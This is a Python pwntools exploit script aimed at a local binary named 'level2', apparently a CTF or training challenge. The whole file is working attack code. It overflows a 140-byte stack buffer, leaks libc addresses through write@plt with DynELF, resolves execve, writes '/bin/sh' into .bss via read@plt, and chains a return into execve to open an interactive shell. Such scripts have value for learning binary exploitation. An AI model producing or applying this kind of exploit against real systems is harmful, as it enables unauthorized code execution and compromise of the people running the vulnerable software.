from pwn import *

#p = remote("127.0.0.1", 10001)
p = process("./level2")

elf = ELF("./level2")
bss_base = elf.bss()
plt_write = elf.plt["write"]
plt_read = elf.plt["read"]
vulfun_addr = elf.symbols["vulnerable_function"]
print "[*]write() plt: " + hex(plt_write)
print "[*]read() plt: " + hex(plt_read)
print "[*]vulnerable_function() addr: " + hex(vulfun_addr)
print "[*].bss addr: " + hex(bss_base)


def leak(address):
        payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
        p.send(payload1)
        data = p.recv(4)
        #print "%#x => %s" % (address, (data or '').encode('hex'))
        return data

d = DynELF(leak, elf=ELF('./level2'))

execve_addr = d.lookup('execve', 'libc')
print "[*]execve() addr: " + hex(execve_addr)

#system_addr = d.lookup('system', 'libc')
#print "[*]system() addr: " + hex(system_addr)

pop_pop_pop_ret = 0x080484f9
payload2 = "A" * 140 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_base) + p32(8)
#payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_base)
payload2 += p32(execve_addr) + p32(vulfun_addr) + p32(bss_base) + p32(0) + p32(0)


p.sendline(payload2)
p.sendline("/bin/sh\0")

p.interactive()